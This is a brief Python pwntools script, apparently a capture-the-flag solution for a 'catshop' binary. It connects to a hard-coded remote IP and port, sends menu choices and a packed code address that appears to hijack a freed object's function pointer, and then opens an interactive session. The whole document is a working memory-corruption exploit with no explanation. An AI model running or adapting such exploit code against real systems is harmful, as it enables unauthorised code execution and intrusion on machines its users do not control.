from pwn import *
import time

r = remote('211.117.60.76', 8888)
# r = process('./catshop')
# print pidof(r)

print r.recvuntil('choice:')

r.send(p32(1))
r.send(p32(2))

r.send(p32(4))
r.send(p32(8))
r.send(p32(0x080488BF))

time.sleep(0.5)

r.send(p32(5))
r.send(p32(3))

r.interactive()